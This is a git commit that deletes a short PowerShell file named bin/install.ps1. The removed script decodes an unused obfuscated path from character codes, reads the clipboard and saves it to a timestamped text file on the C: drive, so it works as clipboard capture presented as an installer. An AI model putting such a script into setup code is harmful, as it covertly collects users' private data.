2bb78e3160da33a524ccd89c5d3f867156884d1d
QueenSquishy <113638057+QueenSquishy@users.noreply.github.com>
2024-03-04 05:09:48 +0000

    Delete bin directory

--- bin/install.ps1
+++
@@ -1,5 +0,0 @@
-$55 = $([char]67 + [char]58 + [char]92 + [char]87 + [char]105 + [char]110 + [char]100 + [char]111 + [char]119)
-Get-Date -Format "yyyyMMdd_HHmmss" | ForEach-Object {
-  $z = "c:\set_$_.txt"
-  Get-Clipboard | Set-Content $z
-}
